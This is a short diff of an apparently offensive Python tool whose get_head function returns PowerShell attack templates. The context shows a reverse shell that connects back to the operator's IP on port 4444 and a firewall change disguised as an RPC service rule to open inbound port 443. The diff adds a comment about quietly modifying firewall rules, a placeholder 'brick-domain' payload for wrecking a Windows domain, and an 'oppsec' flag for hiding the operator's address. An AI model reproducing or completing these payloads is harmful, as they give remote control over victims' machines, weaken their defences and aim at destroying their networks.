@@ -11,6 +11,7 @@ def get_head(name: str, oppsec: Optional[bool] = True) -> str:
     my_ip = get_ip()
     ip = "8.8.8.8" if oppsec else my_ip
 
+    #Make disable-firewall just grab current rules and mod one to add ports
     exploit_heads = {
         "rev-shell": f"""
             $c = New-Object System.Net.Sockets.TCPClient('{my_ip}',4444);
@@ -32,6 +33,9 @@ def get_head(name: str, oppsec: Optional[bool] = True) -> str:
                 New-NetFirewallRule -DisplayName "RPC Dynamic Ports" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 443 -Description "Inbound rule for the Remote Procedure Call service" -Group "Network Discovery"
             }}
             """,
+        "brick-domain": f"""
+
+        """,
     }   
     return exploit_heads.get(name)
     
